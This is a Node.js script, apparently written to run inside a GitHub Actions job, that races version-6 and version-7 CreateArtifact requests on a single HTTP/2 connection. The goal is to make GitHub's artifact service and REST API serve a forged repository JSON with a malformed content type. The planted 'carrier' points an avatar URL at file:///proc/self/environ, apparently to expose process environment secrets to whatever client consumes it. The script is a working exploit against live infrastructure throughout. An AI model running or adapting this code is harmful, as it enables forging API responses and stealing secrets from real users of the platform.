'use strict';

// Build a raw Actions artifact while racing the version-6 MIME path and the
// version-7 raw-delivery path. Both CreateArtifact bodies are staged on one
// HTTP/2 connection and released with controlled END_STREAM offsets.

const crypto = require('node:crypto');
const fs = require('node:fs');
const http2 = require('node:http2');
const https = require('node:https');

const SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD_TYPE = '\x85application/json';
const ODD_HEX = Buffer.from(ODD_TYPE, 'latin1').toString('hex');
const OFFSETS = [-16, -8, -4, -2, -1, 0, 1, 2, 4, 8, 16, 32];
const REPEATS = 5;
const BATCH = 12;

function fail(message) { throw new Error(message); }
function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

function backendIds(token) {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) fail('Actions.Results scope unavailable');
  return {run: fields[1], job: fields[2]};
}

function request(url, {method = 'GET', headers = {}, body = null} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

async function twirp(method, token, value) {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(`${origin}/twirp/${SERVICE}/${method}`, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    fail(`${method} HTTP ${response.status}: ${response.body.toString().slice(0, 160)}`);
  }
  return JSON.parse(response.body.toString());
}

async function putBlob(url, body) {
  const response = await request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD_TYPE,
    },
    body,
  });
  if (response.status < 200 || response.status >= 300) {
    fail(`blob PUT HTTP ${response.status}`);
  }
}

function connectH2(origin) {
  return new Promise((resolve, reject) => {
    const client = http2.connect(origin);
    const timer = setTimeout(() => {
      client.destroy();
      reject(new Error('HTTP/2 connect timeout'));
    }, 20000);
    client.once('connect', () => {
      clearTimeout(timer);
      if (client.alpnProtocol !== 'h2') return reject(new Error(`ALPN was ${client.alpnProtocol}`));
      resolve(client);
    });
    client.once('error', reject);
  });
}

function stageH2(client, path, token, body) {
  const stream = client.request({
    ':method': 'POST',
    ':path': path,
    authorization: `Bearer ${token}`,
    accept: 'application/json',
    'content-type': 'application/json',
    'content-length': String(body.length),
  }, {endStream: false});
  let responseHeaders = {};
  const chunks = [];
  const result = new Promise((resolve, reject) => {
    stream.on('response', headers => { responseHeaders = headers; });
    stream.on('data', chunk => chunks.push(Buffer.from(chunk)));
    stream.on('end', () => resolve({
      status: Number(responseHeaders[':status'] || 0),
      body: Buffer.concat(chunks),
    }));
    stream.on('error', reject);
  });
  return new Promise((resolve, reject) => {
    stream.write(body.subarray(0, -1), error => {
      if (error) return reject(error);
      resolve({release: () => stream.end(body.subarray(-1)), result});
    });
  });
}

function summarize(version, response) {
  let value = {};
  try { value = JSON.parse(response.body.toString()); } catch {}
  const url = value.signed_upload_url || value.signedUploadUrl || '';
  let pathHash = '';
  try {
    pathHash = crypto.createHash('sha256').update(new URL(url).pathname).digest('hex').slice(0, 12);
  } catch {}
  return {
    version,
    status: response.status,
    ok: Boolean(value.ok),
    url,
    pathHash,
    message: String(value.msg || '').slice(0, 100),
  };
}

async function raceCreate(client, path, token, ids, name, offset) {
  const specs = [[6, ODD_TYPE], [7, 'application/json']];
  let bodies = specs.map(([version, mime]) => Buffer.from(JSON.stringify({
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name,
    version,
    mime_type: mime,
  })));
  const length = Math.max(...bodies.map(body => body.length));
  bodies = bodies.map(body => Buffer.concat([body, Buffer.alloc(length - body.length, 0x20)]));
  const staged = await Promise.all(bodies.map(body => stageH2(client, path, token, body)));
  const first = offset >= 0 ? 0 : 1;
  const second = first ^ 1;
  staged[first].release();
  if (offset === 0) staged[second].release();
  else setTimeout(() => staged[second].release(), Math.abs(offset));
  const responses = await Promise.all(staged.map(item => item.result));
  return responses.map((response, i) => summarize(specs[i][0], response));
}

function carrier(repositoryPath) {
  return Buffer.from(JSON.stringify({
    full_name: repositoryPath,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette v6/v7 race carrier',
    stargazers_count: 0,
  }));
}

function wireSummary(response, expected) {
  const type = Array.isArray(response.headers['content-type'])
    ? response.headers['content-type'][0] : response.headers['content-type'] || '';
  return {
    status: response.status,
    contentTypeHex: Buffer.from(type, 'latin1').toString('hex'),
    bodyMatch: response.body.equals(expected),
    digest: crypto.createHash('sha256').update(response.body).digest('hex'),
  };
}

async function getWithRetries(url, headers) {
  let response;
  for (let attempt = 0; attempt < 5; attempt += 1) {
    response = await request(url, {headers});
    if (![404, 409].includes(response.status)) return response;
    await sleep(300);
  }
  return response;
}

async function verifyRest(repositoryPath, token, body) {
  const headers = {
    accept: 'application/vnd.github.v3+json',
    authorization: `Bearer ${token}`,
    'user-agent': 'repo-cassette-race-verifier',
    'x-github-api-version': '2022-11-28',
  };
  let response = await getWithRetries(`https://api.github.com/repos/${repositoryPath}`, headers);
  if (response.status >= 300 && response.status < 400) {
    response = await request(response.headers.location, {
      headers: {'user-agent': 'repo-cassette-race-verifier'},
    });
  }
  return wireSummary(response, body);
}

async function finish(candidate, token, ids, repository) {
  const created = candidate.creations.filter(x => x.status >= 200 && x.status < 300 && x.ok && x.url);
  const base = {
    index: candidate.index,
    offsetMs: candidate.offset,
    create: candidate.creations.map(x => ({
      version: x.version, status: x.status, ok: x.ok, pathHash: x.pathHash, message: x.message,
    })),
    sameBlobPath: created.length === 2 && created[0].pathHash === created[1].pathHash,
  };
  if (created.length < 2) return {...base, stage: 'create'};

  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map(x => putBlob(x.url, placeholder)));
  const finalized = await twirp('FinalizeArtifact', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name: candidate.name,
    size: String(placeholder.length),
  });
  const artifactId = String(finalized.artifact_id || finalized.artifactId || '');
  if (!finalized.ok || !/^\d+$/.test(artifactId)) return {...base, stage: 'finalize'};

  const repositoryPath = `${repository}/actions/artifacts/${artifactId}/zip`;
  const body = carrier(repositoryPath);
  await Promise.all(created.map(x => putBlob(x.url, body)));
  const signed = await twirp('GetSignedArtifactURL', token, {
    workflow_run_backend_id: ids.run,
    workflow_job_run_backend_id: ids.job,
    name: candidate.name,
  });
  const direct = wireSummary(await getWithRetries(signed.signed_url || signed.signedUrl, {
    'user-agent': 'repo-cassette-race-verifier',
  }), body);
  const result = {...base, artifactId, repositoryPath, direct, winner: false};
  if (direct.status === 200 && direct.contentTypeHex === ODD_HEX && direct.bodyMatch) {
    const rest = await verifyRest(repositoryPath, process.env.GITHUB_TOKEN, body);
    result.rest = rest;
    result.winner = rest.status === 200 && rest.contentTypeHex === ODD_HEX && rest.bodyMatch;
  }
  return result;
}

function output(name, value) {
  if (process.env.GITHUB_OUTPUT) fs.appendFileSync(process.env.GITHUB_OUTPUT, `${name}=${value}\n`);
}

async function main() {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const repository = process.env.GITHUB_REPOSITORY;
  if (!token || !process.env.GITHUB_TOKEN || !repository) fail('Actions environment incomplete');
  const ids = backendIds(token);
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const path = `/twirp/${SERVICE}/CreateArtifact`;
  const client = await connectH2(origin);
  const offsets = Array.from({length: REPEATS}, () => OFFSETS).flat();
  let processed = 0;
  try {
    for (let base = 0; base < offsets.length; base += BATCH) {
      const specs = offsets.slice(base, base + BATCH).map((offset, slot) => ({
        index: base + slot,
        offset,
        name: `repo-cassette-h2-${process.env.GITHUB_RUN_ID}-${process.env.RACE_SHARD || 0}-${base + slot}-${crypto.randomBytes(4).toString('hex')}`,
      }));
      const raced = await Promise.all(specs.map(async item => ({
        ...item,
        creations: await raceCreate(client, path, token, ids, item.name, item.offset),
      })));
      const settled = await Promise.allSettled(raced.map(item => finish(item, token, ids, repository)));
      for (const item of settled) {
        const row = item.status === 'fulfilled' ? item.value : {error: item.reason?.message || String(item.reason)};
        processed += 1;
        console.log(`RACE_RESULT ${JSON.stringify(row)}`);
        if (row.winner) {
          output('winner_artifact_id', row.artifactId);
          output('winner_repository', row.repositoryPath);
          console.log(`RACE_WINNER ${JSON.stringify(row)}`);
          return;
        }
      }
    }
  } finally {
    client.close();
  }
  console.log(`RACE_SUMMARY ${JSON.stringify({processed, offsets: OFFSETS})}`);
  fail('no verified carrier');
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});
